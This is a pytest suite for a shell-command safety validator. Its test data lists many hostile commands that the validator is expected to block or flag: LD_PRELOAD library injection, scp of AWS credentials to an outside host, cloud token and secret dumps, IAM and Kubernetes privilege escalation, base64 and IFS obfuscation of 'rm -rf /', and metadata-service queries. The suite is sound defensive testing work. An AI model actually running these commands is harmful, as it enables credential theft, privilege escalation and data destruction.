"""Tests for security gaps identified in SECURITY_REVIEW_ATTACK_VECTORS.md.

This test suite covers P0 (Critical) and P1 (High-Value) security gaps:
- Dynamic linker attacks (LD_PRELOAD, LD_LIBRARY_PATH)
- Cloud security (AWS/GCP/Azure credential theft, IAM manipulation)
- Obfuscation detection (IFS, base64, hex/octal, brace expansion, variable substring)
- Enhanced kubectl security

NOTE: These tests use validate_command() WITHOUT a config_path parameter,
which causes the validator to load from data/rules/ directory (the organized
rule files including 11_dynamic_linker.yaml and 12_cloud_security.yaml).
"""

from pathlib import Path

import pytest

from schlock.core.rules import RiskLevel, RuleEngine
from schlock.core.validator import validate_command


# Use rules directory for these tests (not the single safety_rules.yaml)
@pytest.fixture(scope="module")
def rules_engine():
    """Load rules from the organized rules directory."""
    rules_dir = Path(__file__).parent.parent / "data" / "rules"
    return RuleEngine.from_directory(rules_dir)


class TestDynamicLinkerAttacks:
    """Test P0: Dynamic linker attacks (LD_PRELOAD, LD_LIBRARY_PATH)."""

    @pytest.mark.parametrize(
        "command,description",
        [
            # LD_PRELOAD attacks (BLOCKED)
            ("export LD_PRELOAD=/tmp/evil.so", "Export LD_PRELOAD"),
            ("LD_PRELOAD=/tmp/evil.so ls", "Direct LD_PRELOAD invocation"),
            ("sudo LD_PRELOAD=/tmp/evil.so id", "Sudo with LD_PRELOAD"),
            ("su LD_PRELOAD=/tmp/evil.so -", "su with LD_PRELOAD"),
            ("echo /tmp/evil.so > /etc/ld.so.preload", "Persistent LD_PRELOAD"),
            ("echo /lib/evil.so >> /etc/ld.so.preload", "Append to ld.so.preload"),
            ("tee /etc/ld.so.preload <<< /tmp/malicious.so", "Tee to ld.so.preload"),
        ],
    )
    def test_ld_preload_attacks_blocked(self, command, description):
        """LD_PRELOAD attacks MUST be BLOCKED."""
        result = validate_command(command)
        assert not result.allowed, f"CRITICAL: {description} was NOT blocked! Command: {command}"
        assert result.risk_level == RiskLevel.BLOCKED

    @pytest.mark.parametrize(
        "command,description",
        [
            # Library path manipulation (HIGH)
            ("export LD_LIBRARY_PATH=/tmp/libs", "Export LD_LIBRARY_PATH"),
            ("LD_LIBRARY_PATH=/tmp:$LD_LIBRARY_PATH ls", "LD_LIBRARY_PATH with /tmp"),
            ("LD_LIBRARY_PATH=/dev/shm/libs ls", "LD_LIBRARY_PATH with /dev/shm"),
            ("export DYLD_INSERT_LIBRARIES=/tmp/evil.dylib", "macOS DYLD_INSERT_LIBRARIES"),
            ("export DYLD_LIBRARY_PATH=/tmp/libs", "macOS DYLD_LIBRARY_PATH"),
            ("DYLD_INSERT_LIBRARIES=/tmp/evil.dylib ./app", "Direct DYLD usage"),
            ("export LD_AUDIT=/tmp/audit.so", "LD_AUDIT attack"),
        ],
    )
    def test_library_path_manipulation_high(self, command, description):
        """Library path manipulation should be HIGH risk."""
        result = validate_command(command)
        assert result.risk_level in [RiskLevel.HIGH, RiskLevel.BLOCKED], (
            f"{description}: Expected HIGH/BLOCKED, got {result.risk_level}"
        )

    @pytest.mark.parametrize(
        "command,description",
        [
            # Suspicious shared library creation (HIGH)
            ("gcc -shared -fPIC evil.c -o /tmp/evil.so", "Compile .so to /tmp"),
            ("gcc -shared -fPIC -o /dev/shm/hook.so hook.c", "Compile .so to /dev/shm"),
            ("g++ -shared -o /tmp/inject.so inject.cpp", "C++ shared lib to /tmp"),
            ("cp libevil.so /tmp/", "Copy .so to /tmp"),
            ("mv hook.so /dev/shm/", "Move .so to /dev/shm"),
        ],
    )
    def test_suspicious_shared_library_high(self, command, description):
        """Suspicious shared library operations should be HIGH or BLOCKED risk."""
        result = validate_command(command)
        assert result.risk_level in [RiskLevel.HIGH, RiskLevel.BLOCKED], (
            f"{description}: Expected HIGH/BLOCKED, got {result.risk_level}"
        )


class TestAWSSecurityRules:
    """Test P0/P1: AWS credential theft, IAM manipulation, secrets access."""

    @pytest.mark.parametrize(
        "command,description",
        [
            # AWS credential theft (BLOCKED)
            ("aws configure get aws_access_key_id", "Get AWS access key"),
            ("aws configure get aws_secret_access_key", "Get AWS secret key"),
            ("aws configure get aws_session_token", "Get AWS session token"),
            ("aws configure list", "List AWS config"),
            ("aws sts get-session-token", "Get STS session token"),
            ("cat ~/.aws/credentials", "Read AWS credentials file"),
            ("scp ~/.aws/credentials user@host:", "Exfiltrate AWS credentials"),
        ],
    )
    def test_aws_credential_theft_blocked(self, command, description):
        """AWS credential theft MUST be BLOCKED."""
        result = validate_command(command)
        assert not result.allowed, f"CRITICAL: {description} was NOT blocked! Command: {command}"
        assert result.risk_level == RiskLevel.BLOCKED

    @pytest.mark.parametrize(
        "command,description",
        [
            # AWS IAM manipulation (BLOCKED)
            ("aws iam create-access-key --user-name admin", "Create IAM access key"),
            (
                "aws iam attach-user-policy --user-name attacker --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
                "Attach admin policy",
            ),
            (
                "aws iam attach-role-policy --role-name lambda-role --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
                "Attach policy to role",
            ),
            ("aws iam put-user-policy --user-name test --policy-name admin", "Put inline policy"),
            ("aws iam create-policy-version --policy-arn arn:aws:iam::123456:policy/test", "Create policy version"),
            ("aws iam update-assume-role-policy --role-name admin", "Update trust policy"),
            ("aws iam add-user-to-group --user-name attacker --group-name admins", "Add user to admin group"),
            ("aws iam create-user --user-name backdoor", "Create IAM user"),
        ],
    )
    def test_aws_iam_manipulation_blocked(self, command, description):
        """AWS IAM manipulation MUST be BLOCKED."""
        result = validate_command(command)
        assert not result.allowed, f"CRITICAL: {description} was NOT blocked! Command: {command}"
        assert result.risk_level == RiskLevel.BLOCKED

    @pytest.mark.parametrize(
        "command,description",
        [
            # AWS Secrets access (BLOCKED)
            ("aws secretsmanager get-secret-value --secret-id prod/db/password", "Get secret value"),
            ("aws secretsmanager list-secrets", "List secrets"),
            ("aws ssm get-parameter --name /prod/api-key --with-decryption", "SSM with decryption"),
            ("aws ssm get-parameters-by-path --path /prod --with-decryption", "SSM path with decryption"),
        ],
    )
    def test_aws_secrets_blocked(self, command, description):
        """AWS Secrets Manager access MUST be BLOCKED."""
        result = validate_command(command)
        assert not result.allowed, f"CRITICAL: {description} was NOT blocked! Command: {command}"
        assert result.risk_level == RiskLevel.BLOCKED

    @pytest.mark.parametrize(
        "command,description",
        [
            # AWS Lambda/compute (HIGH)
            ("aws lambda invoke --function-name sensitive-func out.json", "Lambda invoke"),
            ("aws lambda update-function-code --function-name app", "Update Lambda code"),
            ("curl http://169.254.169.254/latest/meta-data/", "IMDS access"),
            ("wget http://169.254.169.254/latest/user-data", "IMDS user-data"),
            ("aws ec2 authorize-security-group-ingress --group-id sg-123", "Open security group"),
        ],
    )
    def test_aws_compute_high(self, command, description):
        """AWS compute/Lambda operations should be HIGH risk."""
        result = validate_command(command)
        assert result.risk_level in [RiskLevel.HIGH, RiskLevel.BLOCKED], (
            f"{description}: Expected HIGH/BLOCKED, got {result.risk_level}"
        )


class TestGCPSecurityRules:
    """Test P1: GCP credential theft and secrets access."""

    @pytest.mark.parametrize(
        "command,description",
        [
            # GCP credential theft (BLOCKED)
            ("gcloud auth print-access-token", "Print GCP access token"),
            ("gcloud auth print-identity-token", "Print identity token"),
            ("gcloud auth application-default print-access-token", "Print ADC token"),
            ("gcloud iam service-accounts keys create key.json --iam-account=admin@proj.iam", "Create SA key"),
        ],
    )
    def test_gcp_credential_theft_blocked(self, command, description):
        """GCP credential theft MUST be BLOCKED."""
        result = validate_command(command)
        assert not result.allowed, f"CRITICAL: {description} was NOT blocked! Command: {command}"
        assert result.risk_level == RiskLevel.BLOCKED

    @pytest.mark.parametrize(
        "command,description",
        [
            # GCP Secrets (BLOCKED)
            ("gcloud secrets versions access latest --secret=db-password", "Access secret"),
            ("gcloud secrets list", "List secrets"),
        ],
    )
    def test_gcp_secrets_blocked(self, command, description):
        """GCP Secrets Manager access MUST be BLOCKED."""
        result = validate_command(command)
        assert not result.allowed, f"CRITICAL: {description} was NOT blocked! Command: {command}"
        assert result.risk_level == RiskLevel.BLOCKED


class TestAzureSecurityRules:
    """Test P1: Azure credential theft and secrets access."""

    @pytest.mark.parametrize(
        "command,description",
        [
            # Azure credential theft (BLOCKED)
            ("az account get-access-token", "Get Azure access token"),
            ("az ad sp credential reset --id app-id", "Reset SP credential"),
        ],
    )
    def test_azure_credential_theft_blocked(self, command, description):
        """Azure credential theft MUST be BLOCKED."""
        result = validate_command(command)
        assert not result.allowed, f"CRITICAL: {description} was NOT blocked! Command: {command}"
        assert result.risk_level == RiskLevel.BLOCKED

    @pytest.mark.parametrize(
        "command,description",
        [
            # Azure Key Vault (BLOCKED)
            ("az keyvault secret show --vault-name prod-vault --name db-password", "Show KV secret"),
            ("az keyvault secret list --vault-name prod-vault", "List KV secrets"),
        ],
    )
    def test_azure_keyvault_blocked(self, command, description):
        """Azure Key Vault access MUST be BLOCKED."""
        result = validate_command(command)
        assert not result.allowed, f"CRITICAL: {description} was NOT blocked! Command: {command}"
        assert result.risk_level == RiskLevel.BLOCKED


class TestIFSObfuscation:
    """Test P0: IFS manipulation to bypass space filtering."""

    @pytest.mark.parametrize(
        "command,description",
        [
            # IFS obfuscation (BLOCKED)
            ("cat${IFS}/etc/passwd", "IFS as space separator"),
            ("rm${IFS}-rf${IFS}/", "IFS in rm -rf"),
            ("$IFS", "Direct IFS usage"),
            ("IFS=, cat,/etc/passwd", "IFS override"),
            ("${IFS%?}", "IFS parameter expansion"),
        ],
    )
    def test_ifs_obfuscation_blocked(self, command, description):
        """IFS obfuscation MUST be BLOCKED."""
        result = validate_command(command)
        assert not result.allowed, f"CRITICAL: {description} was NOT blocked! Command: {command}"
        assert result.risk_level == RiskLevel.BLOCKED


class TestBase64ShellExecution:
    """Test P0: Base64 decode piped to shell execution."""

    @pytest.mark.parametrize(
        "command,description",
        [
            # Base64 to shell (BLOCKED)
            ("echo cm0gLXJmIC8K | base64 -d | bash", "Base64 decode to bash"),
            ("base64 -d payload.b64 | sh", "Decode file to sh"),
            ("bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dk)", "Inline base64 to bash"),
            ("openssl base64 -d -in payload | bash", "OpenSSL base64 to bash"),
        ],
    )
    def test_base64_shell_blocked(self, command, description):
        """Base64 decode to shell MUST be BLOCKED."""
        result = validate_command(command)
        assert not result.allowed, f"CRITICAL: {description} was NOT blocked! Command: {command}"
        assert result.risk_level == RiskLevel.BLOCKED

    def test_safe_base64_allowed(self):
        """Safe base64 usage should be allowed."""
        result = validate_command("echo 'hello' | base64")
        assert result.allowed


class TestHexOctalEncoding:
    """Test P1: Hex/octal encoding to obfuscate commands."""

    @pytest.mark.parametrize(
        "command,description",
        [
            # Hex/octal encoding (HIGH)
            ("$'\\x72\\x6d'", "Hex escaped 'rm'"),
            ("$'\\162\\155'", "Octal escaped 'rm'"),
            ("echo -e '\\x2f\\x65\\x74\\x63'", "echo -e with hex"),
            ("printf '\\x72\\x6d'", "printf with hex"),
            ("xxd -r -p payload.hex | bash", "xxd reverse"),
        ],
    )
    def test_hex_octal_encoding_high(self, command, description):
        """Hex/octal encoding should be HIGH risk."""
        result = validate_command(command)
        assert result.risk_level in [RiskLevel.HIGH, RiskLevel.BLOCKED], (
            f"{description}: Expected HIGH/BLOCKED, got {result.risk_level}"
        )


class TestBraceExpansionObfuscation:
    """Test P1: Brace expansion to bypass detection."""

    @pytest.mark.parametrize(
        "command,description",
        [
            # Brace expansion (HIGH)
            ("{rm,-rf,/}", "Brace expansion rm -rf /"),
            ("{cat,/etc/passwd}", "Brace expansion cat passwd"),
            ("{sudo,rm,file}", "Brace expansion sudo"),
            ("{chmod,777,/tmp}", "Brace expansion chmod"),
        ],
    )
    def test_brace_expansion_high(self, command, description):
        """Brace expansion obfuscation should be HIGH risk."""
        result = validate_command(command)
        assert result.risk_level in [RiskLevel.HIGH, RiskLevel.BLOCKED], (
            f"{description}: Expected HIGH/BLOCKED, got {result.risk_level}"
        )


class TestVariableSubstringObfuscation:
    """Test P1: Variable substring expansion for path construction."""

    @pytest.mark.parametrize(
        "command,description",
        [
            # Variable substring (HIGH)
            ("${PATH:0:1}etc${PATH:0:1}passwd", "PATH substring for /"),
            ("${HOME:0:1}etc${HOME:0:1}shadow", "HOME substring for /"),
            ("cat ${PWD:0:1}etc${PWD:0:1}passwd", "PWD substring"),
        ],
    )
    def test_variable_substring_high(self, command, description):
        """Variable substring obfuscation should be HIGH risk."""
        result = validate_command(command)
        assert result.risk_level in [RiskLevel.HIGH, RiskLevel.BLOCKED], (
            f"{description}: Expected HIGH/BLOCKED, got {result.risk_level}"
        )


class TestGlobObfuscation:
    """Test P1: Glob patterns to obfuscate command names."""

    @pytest.mark.parametrize(
        "command,description",
        [
            # Glob obfuscation (HIGH)
            ("/???/??t /etc/passwd", "Glob pattern /bin/cat"),
            ("/???/???/r[m]", "Glob pattern with character class"),
        ],
    )
    def test_glob_obfuscation_high(self, command, description):
        """Glob obfuscation should be HIGH risk."""
        result = validate_command(command)
        assert result.risk_level in [RiskLevel.HIGH, RiskLevel.BLOCKED], (
            f"{description}: Expected HIGH/BLOCKED, got {result.risk_level}"
        )


class TestKubectlSecurityRules:
    """Test P1: Enhanced kubectl security rules."""

    @pytest.mark.parametrize(
        "command,description",
        [
            # Kubernetes secrets theft (BLOCKED)
            ("kubectl get secrets -o json", "Get secrets as JSON"),
            ("kubectl get secret db-creds -o yaml", "Get secret as YAML"),
            ("kubectl describe secret db-creds", "Describe secret"),
            ("kubectl get secret api-key -o jsonpath='{.data.token}'", "Extract secret data"),
        ],
    )
    def test_kubectl_secrets_blocked(self, command, description):
        """kubectl secrets theft MUST be BLOCKED."""
        result = validate_command(command)
        assert not result.allowed, f"CRITICAL: {description} was NOT blocked! Command: {command}"
        assert result.risk_level == RiskLevel.BLOCKED

    @pytest.mark.parametrize(
        "command,description",
        [
            # Kubernetes RBAC manipulation (BLOCKED)
            (
                "kubectl create clusterrolebinding attacker --clusterrole=cluster-admin --user=attacker",
                "Create cluster-admin binding",
            ),
            ("kubectl create rolebinding admin --clusterrole=cluster-admin --user=user", "Create admin rolebinding"),
            ("kubectl patch clusterrolebinding admins", "Patch RBAC"),
            ("kubectl edit clusterrole admin", "Edit cluster role"),
        ],
    )
    def test_kubectl_rbac_blocked(self, command, description):
        """kubectl RBAC manipulation MUST be BLOCKED."""
        result = validate_command(command)
        assert not result.allowed, f"CRITICAL: {description} was NOT blocked! Command: {command}"
        assert result.risk_level == RiskLevel.BLOCKED

    @pytest.mark.parametrize(
        "command,description",
        [
            # kubectl exec (HIGH)
            ("kubectl exec -it pod-name -- /bin/bash", "Interactive bash exec"),
            ("kubectl exec -it deployment/app -- sh", "Exec into deployment"),
            ("kubectl exec mypod -it -- /bin/sh", "Exec with -it flags"),
        ],
    )
    def test_kubectl_exec_high(self, command, description):
        """kubectl exec should be HIGH risk."""
        result = validate_command(command)
        assert result.risk_level in [RiskLevel.HIGH, RiskLevel.BLOCKED], (
            f"{description}: Expected HIGH/BLOCKED, got {result.risk_level}"
        )

    @pytest.mark.parametrize(
        "command,description",
        [
            # kubectl debug (HIGH)
            ("kubectl debug node/worker-1 -it --image=ubuntu", "Debug node"),
            ("kubectl debug pod/myapp --image=busybox", "Debug with custom image"),
            ("kubectl debug mypod --share-processes", "Debug with shared processes"),
        ],
    )
    def test_kubectl_debug_high(self, command, description):
        """kubectl debug should be HIGH risk."""
        result = validate_command(command)
        assert result.risk_level in [RiskLevel.HIGH, RiskLevel.BLOCKED], (
            f"{description}: Expected HIGH/BLOCKED, got {result.risk_level}"
        )

    @pytest.mark.parametrize(
        "command,description",
        [
            # kubectl port-forward (HIGH)
            ("kubectl port-forward svc/database 5432:5432", "Port forward to DB"),
            ("kubectl port-forward pod/redis 6379:6379", "Port forward to Redis"),
        ],
    )
    def test_kubectl_port_forward_high(self, command, description):
        """kubectl port-forward should be HIGH risk."""
        result = validate_command(command)
        assert result.risk_level in [RiskLevel.HIGH, RiskLevel.BLOCKED], (
            f"{description}: Expected HIGH/BLOCKED, got {result.risk_level}"
        )

    @pytest.mark.parametrize(
        "command,description",
        [
            # kubectl cp (HIGH)
            ("kubectl cp mypod:/etc/passwd ./passwd", "Copy /etc/passwd from pod"),
            ("kubectl cp pod:/var/run/secrets/token .", "Copy secret token"),
            ("kubectl cp mypod:/root/.ssh/id_rsa ./key", "Copy SSH key"),
        ],
    )
    def test_kubectl_cp_high(self, command, description):
        """kubectl cp exfiltration should be HIGH risk."""
        result = validate_command(command)
        assert result.risk_level in [RiskLevel.HIGH, RiskLevel.BLOCKED], (
            f"{description}: Expected HIGH/BLOCKED, got {result.risk_level}"
        )

    def test_safe_kubectl_allowed(self):
        """Safe kubectl commands should be allowed."""
        result = validate_command("kubectl get pods")
        assert result.allowed


class TestAlternativeContainerRuntimes:
    """Test P2: Alternative container runtime security."""

    @pytest.mark.parametrize(
        "command,description",
        [
            # Podman
            ("podman run -v /:/host ubuntu", "Podman root mount"),
            ("podman run --cap-add=SYS_ADMIN ubuntu", "Podman SYS_ADMIN"),
            ("podman run --pid host fedora", "Podman host PID"),
            # containerd
            ("ctr run --privileged docker.io/library/ubuntu:latest test", "ctr privileged"),
            ("ctr task exec mycontainer /bin/sh", "ctr task exec"),
            # CRI-O
            ("crictl exec -it container-id /bin/bash", "crictl exec interactive"),
        ],
    )
    def test_alternative_runtimes_high(self, command, description):
        """Alternative container runtime dangerous operations should be HIGH risk."""
        result = validate_command(command)
        assert result.risk_level in [RiskLevel.HIGH, RiskLevel.BLOCKED], (
            f"{description}: Expected HIGH/BLOCKED, got {result.risk_level}"
        )


class TestCloudMetadataAccess:
    """Test P1: Cloud metadata service access (SSRF vector)."""

    @pytest.mark.parametrize(
        "command,description",
        [
            # AWS IMDS
            ("curl http://169.254.169.254/latest/meta-data/", "AWS IMDS curl"),
            ("wget http://169.254.169.254/latest/user-data", "AWS IMDS wget"),
            # GCP metadata
            ("curl http://metadata.google.internal/computeMetadata/v1/", "GCP metadata"),
            # Azure IMDS
            ("curl http://169.254.169.254/metadata/instance?api-version=2021-02-01", "Azure IMDS"),
        ],
    )
    def test_cloud_metadata_high(self, command, description):
        """Cloud metadata access should be HIGH risk."""
        result = validate_command(command)
        assert result.risk_level in [RiskLevel.HIGH, RiskLevel.BLOCKED], (
            f"{description}: Expected HIGH/BLOCKED, got {result.risk_level}"
        )


class TestFalsePositivesNewRules:
    """Ensure new rules don't create false positives."""

    @pytest.mark.parametrize(
        "command,description",
        [
            # Safe AWS commands
            ("aws s3 ls", "List S3 buckets"),
            ("aws ec2 describe-instances", "Describe EC2 instances"),
            # Safe kubectl commands
            ("kubectl get pods", "List pods"),
            ("kubectl logs deployment/app", "Get logs"),
            ("kubectl describe pod myapp", "Describe pod (not secret)"),
            # Safe docker commands
            ("docker run ubuntu echo hello", "Simple docker run"),
            ("docker ps", "List containers"),
            # Safe base64 usage
            ("echo hello | base64", "Encode to base64"),
            ("base64 file.txt > encoded.txt", "Encode file"),
        ],
    )
    def test_false_positives_avoided(self, command, description):
        """Legitimate commands should NOT be blocked."""
        result = validate_command(command)
        assert result.risk_level in [
            RiskLevel.SAFE,
            RiskLevel.LOW,
            RiskLevel.MEDIUM,
        ], f"False positive: {description} got {result.risk_level}, should be SAFE/LOW/MEDIUM"
